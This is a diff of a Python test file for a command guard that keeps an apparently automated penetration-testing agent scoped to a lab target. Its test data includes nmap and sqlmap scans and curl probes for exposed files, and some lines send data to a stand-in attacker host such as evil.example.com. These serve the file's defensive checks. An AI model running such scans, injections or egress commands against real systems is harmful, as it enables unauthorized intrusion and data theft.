@@ -41,6 +41,15 @@ def guard() -> SafetyGuard:
         "sudo nmap 10.13.37.20",      # sudo prefix
         "/usr/bin/nmap 10.13.37.20",  # path prefix stripped
         "sqlmap -u http://10.13.37.20/rest/products/search?q=1 --batch",
+        # A later pipeline stage that merely *mentions* a dotted identifier is not a network
+        # target — its binary (python3 / jq / grep) is not a network tool, so it is not scanned.
+        'curl -s http://10.13.37.20:3000/api-docs | python3 -c "import sys,json; d=json.load(sys.stdin); print(d)"',
+        "curl -s http://10.13.37.20:3000/ | grep -oE 'config.yaml'",
+        "nmap -sV 10.13.37.20 | tee results.out",
+        # A dotted filename in the URL PATH is not a host (live Flash-Next run: `/ftp/eastere.gg`
+        # was wrongly blocked as "out-of-scope host: eastere.gg").
+        "curl -s http://10.13.37.20:3000/ftp/eastere.gg",
+        "curl -s http://10.13.37.20:3000/ftp/package.json.bak | head",
     ],
 )
 def test_permits_in_scope_allowed(guard: SafetyGuard, cmd: str) -> None:
@@ -115,6 +124,26 @@ def test_email_skip_does_not_open_egress_hole(guard: SafetyGuard) -> None:
     assert not guard.allow_command("nmap evil.example.com", step=1).permitted
     off_url = 'curl http://evil.example.com/ -d "email=a@target.local"'
     assert not guard.allow_command(off_url, step=1).permitted
+
+
+def test_pipeline_segment_is_attributed_to_its_own_binary(guard: SafetyGuard) -> None:
+    # Regression (v3 bake-off): `curl <in-scope> | python3 -c "...json.load(sys.stdin)..."` was
+    # blocked as "out-of-scope host: json.load" because the whole line was scanned under curl's
+    # network-tool status. The FQDN scan now runs per stage, attributed to that stage's binary.
+    cmd = (
+        'curl -s http://10.13.37.20:3000/v3/api-docs '
+        '| python3 -c "import sys,json; d=json.load(sys.stdin); '
+        "print('\\n'.join(sorted(d.get('paths',{}).keys())))\" 2>/dev/null | head -80"
+    )
+    d = guard.allow_command(cmd, step=1)
+    assert d.permitted, f"pipeline wrongly blocked: {d.reason}"
+
+
+def test_segment_scan_still_catches_egress(guard: SafetyGuard) -> None:
+    # The per-segment scan must not open a hole: an off-scope host in a network-tool stage, or
+    # in any URL, is still refused.
+    assert not guard.allow_command("curl http://10.13.37.20/ | nmap evil.example.com", step=1).permitted
+    assert not guard.allow_command("cat x | curl http://evil.example.com/", step=1).permitted
 
 
 def test_decision_is_frozen() -> None:
